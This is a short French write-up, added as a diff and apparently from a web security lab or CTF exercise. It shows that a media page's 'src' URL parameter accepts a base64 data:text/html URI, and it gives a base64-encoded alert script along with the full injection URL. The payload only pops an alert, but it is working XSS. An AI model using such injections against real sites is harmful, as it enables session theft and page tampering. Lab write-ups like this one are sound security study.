@@ -1,0 +1,6 @@
+Sur la page Home, si on clique sur l'image NSA on arrive sur une nouvelle page où on remarque des parametres sur l'URL.
+Le parametre src correspond a l'image a afficher en base64, on essaye donc d'envoyer un script en base64 à la place.
+
+<script>alert("Hello World!")</script> -> PHNjcmlwdD5hbGVydCgiSGVsbG8gV29ybGQhIik8L3NjcmlwdD4=
+
+http://YOURADDRESSIP/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8gV29ybGQhIik8L3NjcmlwdD4=
